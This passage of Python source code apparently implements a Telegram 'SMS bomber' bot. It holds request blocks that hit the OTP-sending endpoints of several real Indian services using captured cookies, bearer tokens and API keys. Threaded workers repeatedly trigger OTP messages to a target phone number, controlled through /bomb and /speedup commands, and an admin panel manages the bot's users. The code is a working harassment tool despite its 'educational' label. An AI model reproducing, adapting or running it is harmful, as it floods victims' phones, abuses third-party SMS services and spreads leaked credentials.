                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJ1bmlxdWVfYXNzaWduZWRfbnVtYmVyIjoiYjViMWVmNGQtZGI0MS00NzExLThjMjAtMGU4NjQyZDBlMDJiIiwiY3JlYXRlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjQzOjExIEFNIiwiZXhwaXJlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjU4OjExIEFNIiwiaWF0IjoxNzU5ODEwMzkxLCJpc3MiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJhdWQiOiJodHRwczovL2hvc3QtdXJsIiwiZXhwIjoxNzU5ODExMjkxfQ.N8a-NMFqmgO0vtY9Bp14EF22Jo3bMEB4n_OlcgwF3RZdIJDg5ZwC_WFc1aI-AU7BdWjpfrEc52ZSsfQ73S8pnY8RePnJrKqmE61vdWRY37VAULvD99eMl2AS7W2lEdE5EZoGGM2WqBuTzW8aO5QIt98deWDSyK9xG0v4tfbYG0469g7mOOpeCAuZC3gTIKZ93k7aHyMcf5FPjSsfIdNxqmdW0IrRx6bOdyr_w3AmYheg4aNNfMi5bc6fu_eKXABuwC9O420CFai9TIkImUEqr8Rxy4Sfe7aFVTN6DB8Fv_J1i7GBgCa3YX0VfZiGpVowXmcTqJQcGSiH4uZVRsmf3g', 
                'Connection': 'keep-alive', 
                'Content-Type': 'application/json', 
                'Origin': 'https://oneservice.adityabirlacapital.com', 
                'Referer': 'https://oneservice.adityabirlacapital.com/login', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'authToken': 'eyJraWQiOiJLY2NMeklBY3RhY0R5TWxHVmFVTm52XC9xR3FlQjd2cnNwSWF3a0Z0M21ZND0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzcGRsN2xobHI4ZDkxNm1qcDNyaWt1dGNlIiwidG9rZW5fdXNlIjoiYWNjZXNzIiwic2NvcGUiOiJhdXRoXC9zdmNhcHAiLCJhdXRoX3RpbWUiOjE3NTk4MDcyNDEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5hcC1zb3V0aC0xLmFtYXpvbmF3cy5jb21cL2FwLXNvdXRoLTFfd2h3N0dGb0oxIiwiZXhwIjoxNzU5ODE0NDQxLCJpYXQiOjE3NTk4MDcyNDEsInZlcnNpb24iOjIsImp0aSI6IjVjNTM1ODkxLTBiZjItNDk3ZS04ZTZiLWNkZWZiNzA0OGY1YyIsImNsaWVudF9pZCI6InNwZGw3bGhscjhkOTE2bWpwM3Jpa3V0Y2UifQ.noVIL6Tks0NHZwCmokdjx4hpXntkuNQQjPglIwk-4qG6_DzqmJkYxRkH_ekYxbP0kiWpQp4iDLZasiiP5EIlAXgGZHEY5dEf0jAaiIl8EEGtj4VkUV46njil4LOBFCxsdNfJ-i4hO6iCBddwXu_6OMWJArERdPlg6cpej_y91aPe-UjSuaHexSTmtdzoTRGnZw5W57uiVRZwY3iCPjLWEY-8Qj9a0HqSwTg7oNvOOMac5hCif4IoCNCMP8VoR4F-EttDdWpqW3hETGE6VBMU8R3rY2Q-Vm4CB2VdbToSGtjxFwuMq66OMpVM_G7Fq478JgPhmv9sb85bo2jto8gvow', 
                'browser': 'Microsoft Edge', 
                'browserVersion': '141.0', 
                'csUserId': 'CS6GGNB62PFDLHX6', 
                'loginSource': '26', 
                'pageName': '/login', 
                'source': '151', 
                'traceId': 'CSNwb9nPLzWrVfpl'
            }
            
            data = {'request':'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            response = session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', headers=headers, cookies=cookies, json=data, timeout=5)
            return response.status_code == 200

        # 28: Pinknblu
        elif lim == 28:
            cookies = {
                '_ga': 'GA1.1.1922530896.1759808413', 
                '_gcl_au': '1.1.178541594.1759808413', 
                '_fbp': 'fb.1.1759808414134.913709261257829615', 
                'laravel_session': 'eyJpdiI6IllNM0Z5dkxySUswTlBPVjFTN09KMkE9PSIsInZhbHVlIjoiT1pXQWxLUVdYNXJ0REJmU3Q5R0EzNWc5cGJHbzVsaG5oWjRweFRTNG9cL2l4MHdXUVdTWEFtbEsybDdvTjAyazN4dERkdEsrMlBQeTdYUTR4RXNhNWM5WDlrZGtqOEk2eEVcL1BUUEhoN0F4YjJGTWZKd0tcL2JaQitXZmxWWjRcL0hXIiwibWFjIjoiMTNlZDhlNzM2MmIyMzRlODBlNWU0NTJkYjdlOTY5MmJhMzAzM2UyZjEwODAwOTk5Mzk1Yzc3ZTUyZjBhM2I4ZSJ9', 
                '_ga_8B7LH5VE3Z': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h1570660322', 
                '_ga_S6S2RJNH92': 'GS2.1.s1759808413$o1$g1$t1759809854$j30$l0$h0'
            }
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01', 
                'Accept-Language': 'en-US,en;q=0.9', 
                'Connection': 'keep-alive', 
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Origin': 'https://pinknblu.com', 
                'Referer': 'https://pinknblu.com/', 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'X-Requested-With': 'XMLHttpRequest', 
                'sec-ch-ua': '"Microsoft Edge";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 
                'sec-ch-ua-mobile': '?0', 
                'sec-ch-ua-platform': '"Windows"'
            }
            data = {
                '_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 
                'country_code': f'+{cc}', 
                'phone': pn
            }
            response = session.post('https://pinknblu.com/v1/auth/generate/otp', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 29: Udaan
        elif lim == 29:
            cookies = {
                'gid': 'GA1.2.153419917.1759810454', 
                'sid': 'AVr5misBh4gBAIMSGSayAIeIHvwJYsleAXWkgb87eYu92RyIEsDTp7Wan8qrnUN7IeMj5JEr1bpwY95aCuF1rYO/', 
                'WZRK_S_8R9-67W-W75Z': '%7B%22p%22%3A1%7D', 
                'mp_a67dbaed1119f2fb093820c9a14a2bcc_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3Ac4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24device_id%22%3A%22c4623ce0-2ae9-45d3-9f83-bf345b88cb99%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fudaan.com%2F%22%2C%22%24initial_referring_domain%22%3A%22udaan.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D', 
                '_ga_VDVX6P049R': 'GS2.1.s1759810459$o1$g0$t1759810459$j60$l0$h0', 
                '_ga': 'GA1.1.803417298.1759810454'
            }
            headers = {
                'accept': '/*', 
                'accept-language': 'en-IN', 
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 
                'origin': 'https://auth.udaan.com', 
                'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2', 
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0', 
                'x-app-id': 'udaan-auth'
            }
            data = {'mobile': pn}
            url = 'https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true'
            response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()
            
        # 30: Nuvama Wealth
        elif lim == 30:
            headers = {
              'api-key': 'c41121ed-b6fb-c9a6-bc9b-574c82929e7e', 
              'Referer': 'https://onboarding.nuvamawealth.com/', 
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0', 
              'Content-Type': 'application/json'
            }
            data = {"contactInfo": pn, "mode": "SMS"}
            response = session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', headers=headers, json=data, timeout=5)
            return response.status_code == 200 or 'success' in response.text.lower()

        return False

    except requests.exceptions.RequestException:
        return False
    except Exception:
        return False

# ------------------------------------------------------------------
# Worker thread with dynamic interval
# ------------------------------------------------------------------
def api_worker(user_id, phone_number, api_index, stop_flag):
    cc = DEFAULT_COUNTRY_CODE
    while not stop_flag.is_set():
        interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
        try:
            success = getapi(phone_number, api_index, cc)
            with global_request_counter:
                request_counts[user_id] = request_counts.get(user_id, 0) + 1
            if not success:
                logger.debug(f"API {api_index} failed for {phone_number}")
        except Exception as e:
            logger.error(f"API worker error: {e}")
        for _ in range(int(interval * 2)):
            if stop_flag.is_set():
                break
            time.sleep(0.5)

async def perform_bombing_task(user_id, phone_number, context):
    stop_flag = threading.Event()
    bombing_active[user_id] = stop_flag
    request_counts[user_id] = 0
    user_intervals[user_id] = BOMBING_INTERVAL_SECONDS
    user_start_time[user_id] = time.time()

    workers = []
    for api_idx in API_INDICES:
        t = threading.Thread(target=api_worker, args=(user_id, phone_number, api_idx, stop_flag))
        t.daemon = True
        workers.append(t)
        t.start()
    bombing_threads[str(user_id)] = workers

    start_msg = (
        f"🔥 Bombing started on `{escape_md(phone_number)}`.\n"
        f"Using {len(API_INDICES)} APIs every {BOMBING_INTERVAL_SECONDS} seconds.\n"
        f"Auto‑stop after 20 minutes.\n"
        f"Use `/stop` to stop. Use `/speedup` / `/speeddown` to change interval.{BRANDING}"
    )
    await context.bot.send_message(
        chat_id=user_id,
        text=start_msg,
        parse_mode=ParseMode.MARKDOWN_V2
    )

    last_count = 0
    last_message_time = 0
    try:
        while not stop_flag.is_set():
            await asyncio.sleep(1)
            current_count = request_counts.get(user_id, 0)
            current_time = time.time()
            if current_time - user_start_time.get(user_id, current_time) >= AUTO_STOP_SECONDS:
                logger.info(f"Auto‑stop triggered for user {user_id} after 20 minutes")
                stop_flag.set()
                break
            if current_count > last_count and (current_time - last_message_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
                interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
                status_msg = (
                    f"📊 Status: `{current_count}` requests sent. "
                    f"Interval: `{interval}` sec.{BRANDING}"
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text=status_msg,
                    parse_mode=ParseMode.MARKDOWN_V2
                )
                last_count = current_count
                last_message_time = current_time
            if current_count >= MAX_REQUEST_LIMIT:
                stop_flag.set()
                break
    except asyncio.CancelledError:
        pass
    finally:
        stop_flag.set()
        for t in workers:
            t.join(timeout=2)
        if str(user_id) in bombing_threads:
            del bombing_threads[str(user_id)]
        final_count = request_counts.pop(user_id, 0)
        user_intervals.pop(user_id, None)
        user_start_time.pop(user_id, None)
        final_msg = f"✅ Bombing finished. Total requests sent: `{final_count}`.{BRANDING}"
        await context.bot.send_message(
            chat_id=user_id,
            text=final_msg,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        if user_id in bombing_active:
            del bombing_active[user_id]

# ------------------------------------------------------------------
# Speed commands
# ------------------------------------------------------------------
async def speedup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in bombing_active or bombing_active[user_id].is_set():
        await update.message.reply_text(
            "No active bombing session. Start one with /bomb." + BRANDING,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
    new_val = max(MIN_INTERVAL, current - 1)
    user_intervals[user_id] = new_val
    await update.message.reply_text(
        f"⚡ Speed increased. New interval: {new_val} seconds.{BRANDING}",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def speeddown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in bombing_active or bombing_active[user_id].is_set():
        await update.message.reply_text(
            "No active bombing session. Start one with /bomb." + BRANDING,
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
    new_val = min(MAX_INTERVAL, current + 1)
    user_intervals[user_id] = new_val
    await update.message.reply_text(
        f"🐢 Speed decreased. New interval: {new_val} seconds.{BRANDING}",
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ------------------------------------------------------------------
# Helper: send any message (text or media)
# ------------------------------------------------------------------
async def send_any_message(context, chat_id, update, text=None):
    if update.message.reply_to_message:
        try:
            await context.bot.copy_message(
                chat_id=chat_id,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.reply_to_message.message_id
            )
            return True
        except Exception as e:
            logger.error(f"Failed to copy message: {e}")
            if text:
                await context.bot.send_message(chat_id=chat_id, text=text)
            return False
    else:
        if text:
            await context.bot.send_message(chat_id=chat_id, text=text)
            return True
    return False

# ------------------------------------------------------------------
# Admin decorators
# ------------------------------------------------------------------
def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_admin(user_id):
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_owner(user_id):
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ------------------------------------------------------------------
# Public Commands
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name)
    await update.message.reply_text(
        f"Welcome {escape_md(user.first_name)}! 🤖\n"
        f"Commands:\n/bomb <number> - Start bombing (educational)\n/stop - Stop active bombing\n/speedup - Increase bombing speed\n/speeddown - Decrease bombing speed\n/menu - Show menu{BRANDING}",
        parse_mode=ParseMode.MARKDOWN_V2
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        logger.info(f"Bomb command received from {user_id} with args: {context.args}")
        if not context.args:
            await update.message.reply_text(
                "Usage: /bomb <phone_number>" + BRANDING,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return
        phone = ''.join(filter(str.isdigit, context.args[0]))
        if len(phone) < 10:
            await update.message.reply_text(
                "Invalid number. At least 10 digits." + BRANDING,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        user_phone = get_user_phone(user_id)
        if user_phone and user_phone == phone:
            await update.message.reply_text(
                "❌ Self‑bombing is not allowed." + BRANDING,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return

        if user_id in bombing_active and not bombing_active[user_id].is_set():
            bombing_active[user_id].set()
            await asyncio.sleep(1)

        asyncio.create_task(perform_bombing_task(user_id, phone, context))
    except Exception as e:
        logger.error(f"Error in bomb_command: {e}", exc_info=True)
        await update.message.reply_text(
            "An error occurred. Please try again later." + BRANDING,
            parse_mode=ParseMode.MARKDOWN_V2
        )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_flag = bombing_active.get(user_id)
    if stop_flag and not stop_flag.is_set():
        stop_flag.set()
        await update.message.reply_text(
            "🛑 Stop signal sent. Bombing will stop shortly." + BRANDING,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await update.message.reply_text(
            "ℹ️ No active bombing found." + BRANDING,
            parse_mode=ParseMode.MARKDOWN_V2
        )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        keyboard = [[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]
        await update.message.reply_text("Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(
            "Menu:\nUse /bomb, /stop, /speedup, /speeddown" + BRANDING,
            parse_mode=ParseMode.MARKDOWN_V2
        )

# ------------------------------------------------------------------
# Admin Commands (using decorators)
# ------------------------------------------------------------------
@admin_only
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(context.args[0])
        if ban_user(target):
            await update.message.reply_text(f"User {target} banned.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(context.args[0])
        if unban_user(target):
            await update.message.reply_text(f"User {target} unbanned.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("User not found or not banned.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def delete_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /deleteuser <user_id>")
        return
    try:
        target = int(context.args[0])
        if delete_user(target):
            await update.message.reply_text(f"User {target} deleted.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = " ".join(context.args) if context.args else None
    users = get_all_user_ids()
    success = 0
    for uid in users:
        if await send_any_message(context, uid, update, text):
            success += 1
    await update.message.reply_text(f"Broadcast sent to {success}/{len(users)} users.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)

@admin_only
async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /dm <user_id> [message] (or reply to a message)")
        return
    try:
        target = int(context.args[0])
        text = " ".join(context.args[1:]) if len(context.args) > 1 else None
        success = await send_any_message(context, target, update, text)
        if success:
            await update.message.reply_text(f"Message sent to {target}.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("Failed to send.")
    except Exception as e:
        await update.message.reply_text(f"Failed: {e}")

@admin_only
async def bulk_dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /bulkdm <id1,id2,...> [message] (or reply)")
        return
    ids_str = context.args[0]
    ids = [int(x.strip()) for x in ids_str.split(",") if x.strip().isdigit()]
    if not ids:
        await update.message.reply_text("No valid user IDs.")
        return
    text = " ".join(context.args[1:]) if len(context.args) > 1 else None
    success = 0
    for uid in ids:
        if await send_any_message(context, uid, update, text):
            success += 1
    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)

@admin_only
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 0
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    users = get_all_users_paginated(page, 10)
    if not users:
        await update.message.reply_text("No users found.")
        return
    text = f"Users (page {page+1}):\n"
    for u in users:
        text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
    keyboard = []
    if page > 0:
        keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
    if len(users) == 10:
        keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)

@admin_only
async def recent_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 0
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    users = get_recent_users_paginated(page, 10)
    if not users:
        await update.message.reply_text("No recent users.")
        return
    text = f"Recent users (last 7 days) page {page+1}:\n"
    for u in users:
        text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
    keyboard = []
    if page > 0:
        keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
    if len(users) == 10:
        keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)

@admin_only
async def user_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /lookup <user_id>")
        return
    try:
        uid = int(context.args[0])
        user = get_user_by_id(uid)
        if not user:
            await update.message.reply_text("User not found.")
            return
        target = get_user_target(uid) or "None"
        text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}{BRANDING}"
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users_paginated(0, 999999)
    data = [dict(u) for u in users]
    backup_json = json.dumps(data, default=str, indent=2)
    file = io.BytesIO(backup_json.encode())
    file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    await update.message.reply_document(document=file, filename=file.name, caption="Backup of users.")

@owner_only
async def full_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await backup(update, context)

@owner_only
async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    try:
        uid = int(context.args[0])
        set_admin_role(uid, True)
        await update.message.reply_text(f"User {uid} is now admin.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
    except:
        await update.message.reply_text("Invalid user ID.")

@owner_only
async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeadmin <user_id>")
        return
    try:
        uid = int(context.args[0])
        set_admin_role(uid, False)
        await update.message.reply_text(f"User {uid} is no longer admin.{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
    except:
        await update.message.reply_text("Invalid user ID.")

# ------------------------------------------------------------------
# Callback handlers for pagination
# ------------------------------------------------------------------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith("list_users_page:"):
        page = int(data.split(":")[1])
        users = get_all_users_paginated(page, 10)
        if not users:
            await query.edit_message_text("No more users.")
            return
        text = f"Users (page {page+1}):\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data.startswith("recent_users_page:"):
        page = int(data.split(":")[1])
        users = get_recent_users_paginated(page, 10)
        if not users:
            await query.edit_message_text("No more users.")
            return
        text = f"Recent users (page {page+1}):\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data == "admin_panel":
        keyboard = [
            [InlineKeyboardButton("👥 List Users", callback_data="admin_list_users")],
            [InlineKeyboardButton("🕒 Recent Users", callback_data="admin_recent_users")],
            [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")],
        ]
        await query.edit_message_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_list_users":
        users = get_all_users_paginated(0, 10)
        if not users:
            await query.edit_message_text("No users.")
            return
        text = "Users (page 1):\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
        keyboard = []
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data="list_users_page:1"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data == "admin_recent_users":
        users = get_recent_users_paginated(0, 10)
        if not users:
            await query.edit_message_text("No recent users.")
            return
        text = "Recent users (last 7 days) page 1:\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
        keyboard = []
        if len(users) == 10:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data="recent_users_page:1"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data == "admin_stats":
        count = get_user_count()
        await query.edit_message_text(f"Total users: {count}{BRANDING}", parse_mode=ParseMode.MARKDOWN_V2)
    elif data == "back_to_menu":
        user_id = query.from_user.id
        if is_admin(user_id):
            keyboard = [[InlineKeyboardButton("Admin Panel", callback_data="admin_panel")]]
            await query.edit_message_text("Menu:", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            await query.edit_message_text("Menu:")
    else:
        await query.edit_message_text("Unknown action.")

# ------------------------------------------------------------------
# Error Handler
# ------------------------------------------------------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")

# ------------------------------------------------------------------
# Main Webhook Setup
# ------------------------------------------------------------------
def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bomb", bomb_command))
    app.add_handler(CommandHandler("bom", bomb_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("speedup", speedup))
    app.add_handler(CommandHandler("speeddown", speeddown))
    app.add_handler(CommandHandler("menu", menu))

    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CommandHandler("deleteuser", delete_user_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("dm", dm))
    app.add_handler(CommandHandler("bulkdm", bulk_dm))
    app.add_handler(CommandHandler("listusers", list_users))
    app.add_handler(CommandHandler("recent", recent_users))
    app.add_handler(CommandHandler("lookup", user_lookup))
    app.add_handler(CommandHandler("backup", backup))
    app.add_handler(CommandHandler("fullbackup", full_backup))
    app.add_handler(CommandHandler("addadmin", add_admin))
    app.add_handler(CommandHandler("removeadmin", remove_admin))

    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_error_handler(error_handler)

    if WEBHOOK_URL:
        webhook_url = f"{WEBHOOK_URL}/webhook"
        logger.info(f"Starting webhook on {webhook_url}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.error("No WEBHOOK_URL set. Exiting.")
        exit(1)

if __name__ == "__main__":
    main()
